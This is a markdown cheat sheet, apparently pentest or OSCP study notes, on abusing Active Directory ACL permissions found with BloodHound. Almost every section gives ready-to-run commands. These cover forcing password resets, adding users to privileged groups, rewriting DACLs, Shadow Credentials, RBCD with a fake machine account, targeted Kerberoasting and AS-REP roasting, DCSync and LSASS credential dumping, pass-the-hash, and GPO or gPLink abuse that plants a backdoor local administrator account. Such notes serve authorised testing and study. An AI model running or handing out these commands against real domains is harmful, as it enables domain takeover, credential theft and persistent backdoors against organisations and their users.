[AD acl-abuses md 36f15bd2d16c8175ab15e24aace7b33d.md](https://github.com/user-attachments/files/28387513/AD.acl-abuses.md.36f15bd2d16c8175ab15e24aace7b33d.md)

# AD/acl-abuses.md

# ACL / ACE Abuses in Active Directory

**Concept:** AD uses ACLs to control who can do what on each object. BloodHound shows these permissions. Every edge = one exploitation technique.

> **Golden rule:** The BloodHound edge tells you what permission you have. Always run commands as the user on the **source** end of the edge.
> 

---

## Dangerous Permissions Table

| Permission | On | Exploit |
| --- | --- | --- |
| **GenericAll** | User | Change password, Shadow Creds, Targeted Kerberoast |
| **GenericAll** | Group | Add yourself to the group |
| **GenericAll** | Computer | RBCD attack or Shadow Credentials |
| **GenericWrite** | User | Targeted Kerberoast / Shadow Credentials / scriptPath RCE |
| **GenericWrite** | Computer | RBCD or Shadow Credentials |
| **WriteDACL** | Object | Grant yourself GenericAll → exploit |
| **WriteOwner** | Object | Change owner → WriteDACL → GenericAll |
| **ForceChangePassword** | User | Change password without knowing it (noisy) |
| **AddMember / AddSelf** | Group | Add yourself to Domain Admins |
| **WriteProperty** | Group | Add yourself if the attribute is member |
| **AddKeyCredentialLink** | User/Computer | Shadow Credentials directly |
| **WriteAccountRestrictions** | Computer | RBCD |
| **AllowedToAct** | Computer | RBCD directly |
| **AllowedToDelegate** | Account | Constrained/Unconstrained Delegation |
| **GetChanges + GetChangesAll** | Domain | DCSync → all hashes |
| **WriteGPLink / GenericAll** | GPO | GPO Abuse → code execution on all machines in the OU |

---

## 1. GenericAll

```bash
# Target: User — reset password (Linux)
net rpc password <targetUser> 'NewPass123!' -U '<domain>/<user>%<pass>' -S <DC_IP>
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' set password <targetUser> 'NewPass123!'
# Verify
nxc smb <DC_IP> -u <targetUser> -p 'NewPass123!'
```

```powershell
# Target: User — PowerView (Windows)
$cred = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <targetUser> -AccountPassword $cred -Verbose
```

```bash
# Target: Group — add yourself
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' add groupMember "<GroupName>" "<yourUser>"
nxc ldap <DC_IP> -u <user> -p '<pass>' --groups "<GroupName>"  # verify
```

```powershell
# Target: Group (Windows)
Add-DomainGroupMember -Identity '<GroupName>' -Members '<yourUser>'
net group "<GroupName>" <yourUser> /add /domain
```

> **Target Computer:** See RBCD (section 11) or Shadow Credentials (section 9).
> 

---

## 2. GenericWrite

```bash
# Targeted Kerberoasting — add fake SPN and roast
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' set object <targetUser> servicePrincipalName -v "fake/nothing"
nxc ldap <DC_IP> -u <user> -p '<pass>' --kerberoasting kerb.hash
impacket-GetUserSPNs '<domain>/<user>:<pass>' -dc-ip <DC_IP> -request-user <targetUser> -outputfile kerb.hash
hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt
# Clean up SPN after
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' remove object <targetUser> servicePrincipalName -v "fake/nothing"
```

```powershell
# Targeted Kerberoast (Windows)
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname  # clean up
```

> Shadow Credentials: see section 9.
> 

> Computer: see RBCD (section 11) or Shadow Credentials (section 9).
> 

---

## 3. WriteDACL

```bash
# Grant yourself GenericAll on the target (Linux)
dacledit.py -action write -rights FullControl -principal '<yourUser>' -target '<targetObject>' '<domain>/<user>:<pass>' -dc-ip <DC_IP>

# For groups: WriteMembers
dacledit.py -action write -rights WriteMembers -principal '<yourUser>' -target '<GroupName>' '<domain>/<user>:<pass>' -dc-ip <DC_IP>

# For domain: DCSync
dacledit.py -action write -rights DCSync -principal '<yourUser>' -target '<domain>' '<domain>/<user>:<pass>' -dc-ip <DC_IP>

# Verify
nxc ldap <DC_IP> -u <user> -p '<pass>' -M daclread -o TARGET=<targetObject> RIGHTS='*'
```

```powershell
# Windows — PowerView
Add-DomainObjectAcl -Rights All -TargetIdentity <targetObject> -PrincipalIdentity <yourUser> -Verbose
Add-DomainObjectAcl -Rights DCSync -TargetIdentity '<domain>' -PrincipalIdentity <yourUser> -Verbose
```

---

## 4. WriteOwner / Owns

```bash
# Change owner → you automatically get WriteDACL
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' set owner <targetObject> <yourUser>
dacledit.py -action write -rights FullControl -principal '<yourUser>' -target '<targetObject>' '<domain>/<user>:<pass>' -dc-ip <DC_IP>
```

```powershell
Set-DomainObjectOwner -Identity <targetObject> -OwnerIdentity <yourUser>
Add-DomainObjectAcl -Rights All -TargetIdentity <targetObject> -PrincipalIdentity <yourUser> -Verbose
```

---

## 5. AllExtendedRights

```bash
# On user: change password
net rpc password <targetUser> 'NewPass' -U '<domain>/<user>%<pass>' -S <DC_IP>

# On domain: DCSync directly
nxc smb <DC_IP> -u <user> -p '<pass>' --ntds
impacket-secretsdump '<domain>/<user>:<pass>'@<DC_IP>
```

---

## 6. ForceChangePassword

```bash
# Linux
net rpc password <targetUser> 'NewPass123!' -U '<domain>/<user>%<pass>' -S <DC_IP>
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' set password <targetUser> 'NewPass123!'
```

```powershell
$cred = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity <targetUser> -AccountPassword $cred -Verbose
```

> **OSCP tip:** Changing the password is noisy and can break services. If ADCS is available, Shadow Credentials is cleaner.
> 

---

## 7. AddMember / AddSelf

```bash
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' add groupMember "<GroupName>" "<yourUser>"
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' get membership <yourUser>  # verify
```

```powershell
Add-DomainGroupMember -Identity '<GroupName>' -Members '<yourUser>'
net group "<GroupName>" <yourUser> /add /domain
```

---

## 8. WriteProperty

```bash
# If WriteProperty is on the member attribute of a group
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' add groupMember "<GroupName>" "<yourUser>"
dacledit.py -action write -rights WriteMembers -principal '<yourUser>' -target '<GroupName>' '<domain>/<user>:<pass>' -dc-ip <DC_IP>
```

---

## 9. AddKeyCredentialLink → Shadow Credentials

**Concept:** If you have `GenericWrite` or `GenericAll` on a user/computer, you add a fake certificate as an alternative credential and authenticate as them **without changing their password**.

**Requirement:** DC with PKINIT support (Windows Server 2016+ with ADCS).

```bash
# certipy shadow auto — all in one
certipy shadow auto -u '<user>@<domain>' -p '<pass>' -account '<targetUser>' -dc-ip <DC_IP>
# Direct output: NT hash of the targetUser

# Or with pywhisker if certipy fails
pywhisker -d <domain> -u <user> -p '<pass>' --target <targetUser> --action add --dc-ip <DC_IP>
# Output: cert.pfx + passphrase

# Get TGT with the certificate
python3 gettgtpkinit.py -cert-pfx <cert.pfx> -pfx-pass <passphrase> '<domain>/<targetUser>' <targetUser>.ccache
export KRB5CCNAME=<targetUser>.ccache
python3 getnthash.py -key <AS-REP encryption key> '<domain>/<targetUser>'

# With the hash: PTH
nxc smb <DC_IP> -u <targetUser> -H '<NTHash>'
evil-winrm -i <DC_IP> -u <targetUser> -H '<NTHash>'
```

```powershell
# Windows — Whisker + Rubeus
.\Whisker.exe add /target:<targetUser> /domain:<domain> /dc:<DC_FQDN> /path:cert.pfx /password:pfx-pass
.\Rubeus.exe asktgt /user:<targetUser> /certificate:cert.pfx /password:pfx-pass /getcredentials /show /nowrap
```

```bash
# Clean up after
pywhisker -d <domain> -u <user> -p '<pass>' --target <targetUser> --action remove --device-id <DeviceID>
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' remove shadowCredentials <targetUser> --key <key>
```

> Shadow Credentials also works on **computers**. GenericWrite on `SERVER$` → machine's NT hash → secretsdump as SYSTEM.
> 

---

## 10. WriteAccountRestrictions → RBCD

See section 11. The exploit is identical.

---

## 11. AllowedToAct / RBCD

**Concept:** If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer, you make it trust an account you control and request service tickets as any user.

**Requirement:** An account with SPN. Easiest: create a machine account (MachineAccountQuota = 10 by default).

```bash
# Step 1: check MachineAccountQuota
nxc ldap <DC_IP> -u <user> -p '<pass>' -M maq

# Step 2: create fake machine account
impacket-addcomputer '<domain>/<user>:<pass>' -computer-name 'EVIL$' -computer-pass 'Password123!' -dc-ip <DC_IP>

# Step 3: configure RBCD
impacket-rbcd -action write -delegate-to '<VICTIM_COMPUTER$>' -delegate-from 'EVIL$' '<domain>/<user>:<pass>' -dc-ip <DC_IP>
impacket-rbcd -action read  -delegate-to '<VICTIM_COMPUTER$>' '<domain>/<user>:<pass>' -dc-ip <DC_IP>  # verify

# Step 4: request ticket impersonating Administrator
impacket-getST -spn 'cifs/<VICTIM_FQDN>' -impersonate Administrator '<domain>/EVIL$:Password123!' -dc-ip <DC_IP>

# Step 5: use the ticket
export KRB5CCNAME=Administrator@cifs_<VICTIM_FQDN>@<DOMAIN>.ccache
nxc smb <VICTIM_FQDN> -u Administrator -p '' --use-kcache
impacket-secretsdump -k -no-pass '<domain>/Administrator'@<VICTIM_FQDN>
impacket-psexec       -k -no-pass '<domain>/Administrator'@<VICTIM_FQDN>
```

```powershell
# Windows — Powermad + PowerView + Rubeus
. .\Powermad.ps1
New-MachineAccount -MachineAccount EVIL -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

. .\PowerView.ps1
$evil_sid = Get-DomainComputer EVIL -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($evil_sid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity <VICTIM_COMPUTER> -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

.\Rubeus.exe s4u /user:EVIL$ /rc4:<NTLM_EVIL$> /impersonateuser:Administrator /msdsspn:cifs/<VICTIM_FQDN> /nowrap
.\Rubeus.exe ptt /ticket:<base64>
```

---

## 12. AllowedToDelegate → Constrained Delegation

```bash
# Identify accounts with delegation
nxc ldap <DC_IP> -u <user> -p '<pass>' --trusted-for-delegation
impacket-findDelegation '<domain>/<user>:<pass>' -dc-ip <DC_IP>

# Request ticket impersonating Administrator
impacket-getST -spn '<service>/<FQDN>' -impersonate Administrator '<domain>/<delegated_account>:<pass>' -dc-ip <DC_IP>

export KRB5CCNAME=Administrator@<service>_<FQDN>@<DOMAIN>.ccache
nxc smb <FQDN> -u Administrator -p '' --use-kcache
impacket-psexec -k -no-pass '<domain>/Administrator'@<FQDN>
```

```bash
# Unconstrained Delegation — monitor incoming tickets (wait for DA or force with PrinterBug)
# From inside the machine with UD:
.\Rubeus.exe monitor /interval:5 /nowrap
.\Rubeus.exe ptt /ticket:<base64 TGT of the DA>
```

---

## 13. DCSync (GetChanges + GetChangesAll)

```bash
# NXC (most direct)
nxc smb <DC_IP> -u <user> -p '<pass>' --ntds
nxc smb <DC_IP> -u <user> -p '<pass>' --ntds --enabled  # active accounts only

# Impacket
impacket-secretsdump '<domain>/<user>:<pass>'@<DC_IP>
impacket-secretsdump '<domain>/<user>:<pass>'@<DC_IP> -just-dc-user krbtgt
impacket-secretsdump '<domain>/<user>:<pass>'@<DC_IP> -just-dc-user Administrator
```

```powershell
# Mimikatz
.\mimikatz.exe "lsadump::dcsync /domain:<domain> /user:krbtgt" exit
.\mimikatz.exe "lsadump::dcsync /domain:<domain> /all /csv" exit
```

---

## 14. GPO Abuse

```bash
# Linux
python3 pygpoabuse.py '<domain>/<user>:<pass>' -gpo-id '<GPO_GUID>' -dc-ip <DC_IP> \
  -command 'net user hacker Password123! /add && net localgroup administrators hacker /add' \
  -powershell
```

```powershell
# Windows — SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" \
  --Command "cmd.exe" --Arguments "/c net user hacker Password123! /add && net localgroup administrators hacker /add" \
  --GPOName "<GPO_Name>"
gpupdate /force  # force apply
```

---

## 15. AdminTo / HasSession / CanRDP / CanPSRemote

```bash
# AdminTo (local admin on that machine)
nxc smb <TARGET_IP> -u <user> -p '<pass>'              # (Pwn3d!) = local admin
nxc smb <TARGET_IP> -u <user> -p '<pass>' --sam        # dump local hashes
nxc smb <TARGET_IP> -u <user> -p '<pass>' -M lsassy    # dump LSASS
evil-winrm  -i <TARGET_IP> -u <user> -p '<pass>'
impacket-psexec '<domain>/<user>:<pass>'@<TARGET_IP>
impacket-wmiexec '<domain>/<user>:<pass>'@<TARGET_IP>

# PTH
nxc smb <TARGET_IP> -u <user> -H '<NTHash>'
impacket-psexec '<domain>/<user>'@<TARGET_IP> -hashes ':<NTHash>'

# HasSession — target has an active session on that machine
nxc smb <TARGET_IP> -u <admin> -p '<pass>' --loggedon-users  # confirm
nxc smb <TARGET_IP> -u <admin> -p '<pass>' -M lsassy          # dump creds from memory

# CanRDP
xfreerdp /u:<user> /p:'<pass>' /d:<domain> /v:<TARGET_IP>
xfreerdp /u:<user> /pth:<NTHash> /d:<domain> /v:<TARGET_IP>  # PTH with RDP

# CanPSRemote
evil-winrm -i <TARGET_IP> -u <user> -H '<NTHash>'
nxc winrm  <TARGET_IP> -u <user> -p '<pass>' -x "whoami"
```

---

## 16. OU Abuse → gPLink Spoofing

**Synacktiv 2024 technique.** If you have GenericAll/GenericWrite on an OU, you link a malicious GPO that affects all its child objects.

```bash
python3 OUned.py -u '<domain>/<user>:<pass>' -dc-ip <DC_IP> \
  -ou 'OU=<OU_NAME>,<DC_DN>' \
  -command 'net user hacker Pass123! /add && net localgroup administrators hacker /add'
```

---

## 17. Targeted Kerberoasting

```bash
# All-in-one tool
python3 targetedKerberoast.py -d <domain> -u <user> -p '<pass>' --dc-ip <DC_IP> -o hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## 18. Targeted AS-REP Roasting

```bash
# Disable pre-auth and roast
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' add uac <targetUser> -f DONT_REQ_PREAUTH
nxc ldap <DC_IP> -u <user> -p '<pass>' --asreproast asrep.hash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
# Clean up
bloodyAD --host <DC_IP> -d <domain> -u <user> -p '<pass>' remove uac <targetUser> -f DONT_REQ_PREAUTH
```

```powershell
Set-DomainObject -Identity <targetUser> -XOR @{useraccountcontrol=4194304} -Verbose
.\Rubeus.exe asreproast /user:<targetUser> /nowrap /format:hashcat
```

---

## Typical escalation chain (BloodHound)

```
PHASE 0: nxc smb 192.168.x.0/24 → hosts, null sessions, SMB signing

PHASE 1: AS-REP / Spray / Kerberoast → first credentials

PHASE 2: nxc ldap --bloodhound + --users + --shares + spider_plus
         Import into BloodHound → analyze edges

WriteOwner/WriteDACL?
  → Set Owner → Add GenericAll → exploit

GenericWrite on user?
  → Targeted Kerberoast / Shadow Credentials

AddKeyCredentialLink/GenericWrite on PC?
  → Shadow Credentials → NT Hash → PTH

GenericAll/WriteAccountRestrictions on PC?
  → RBCD → impersonate Admin → secretsdump

AddMember on privileged group?
  → Add user → re-enumerate

GetChanges+GetChangesAll on domain?
  → DCSync → nxc --ntds → krbtgt → Golden Ticket

→ Domain Admin ✓
   nxc smb <DC_IP> -u Administrator -H <hash> --ntds
```

---

## Quick Cheat Sheet

| Permission / Situation | Linux tool | Windows tool |
| --- | --- | --- |
| GenericAll → user | `bloodyAD set password` | `Set-DomainUserPassword` |
| GenericAll → group | `bloodyAD add groupMember` | `Add-DomainGroupMember` |
| GenericWrite → user | `targetedKerberoast.py` / pywhisker | Rubeus + Whisker |
| WriteDACL | `dacledit.py -rights FullControl` | `Add-DomainObjectAcl -Rights All` |
| WriteOwner | `bloodyAD set owner`  • dacledit | `Set-DomainObjectOwner` |
| ForceChangePassword | `net rpc password` / bloodyAD | `Set-DomainUserPassword` |
| AddMember | `bloodyAD add groupMember` | `Add-DomainGroupMember` |
| Shadow Credentials | `certipy shadow auto` / pywhisker | `Whisker.exe add` |
| RBCD | `impacket-rbcd`  • `impacket-getST` | PowerView + Rubeus s4u |
| DCSync | `nxc --ntds` / `impacket-secretsdump` | Mimikatz `lsadump::dcsync` |
| GPO Abuse | `pygpoabuse.py` | `SharpGPOAbuse.exe` |
| Pass-the-Hash | `nxc smb <IP> -u user -H hash` | Mimikatz pth |
| Pass-the-Ticket | `export KRB5CCNAME + nxc --use-kcache` | Rubeus ptt |

---

## Linux tools for ACL Abuses

| Tool | Use |
| --- | --- |
| `bloodyAD` | AD object modification via LDAP from Linux (set password, add groupMember, shadow creds, set owner) |
| `dacledit.py` | Read/write DACLs from Linux (Impacket) |
| `pywhisker` | Shadow Credentials from Linux |
| `targetedKerberoast.py` | Targeted Kerberoasting with fake SPN assignment |
| `impacket-rbcd` | Configure RBCD from Linux |
| `impacket-addcomputer` | Create machine accounts for RBCD |
| `impacket-getST` | Request service tickets (S4U2Proxy) |
| `pygpoabuse.py` | GPO abuse from Linux |
| `OUned.py` | gPLink spoofing on OUs (Synacktiv 2024) |

---

## How to find them (BloodHound)

```
In BloodHound:
→ Analysis → Find Shortest Path to Domain Admins
→ Analysis → Find ACL Abuses
→ Node info → Outbound Object Control
→ Node info → Inbound Object Control
```

With PowerView:

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
```
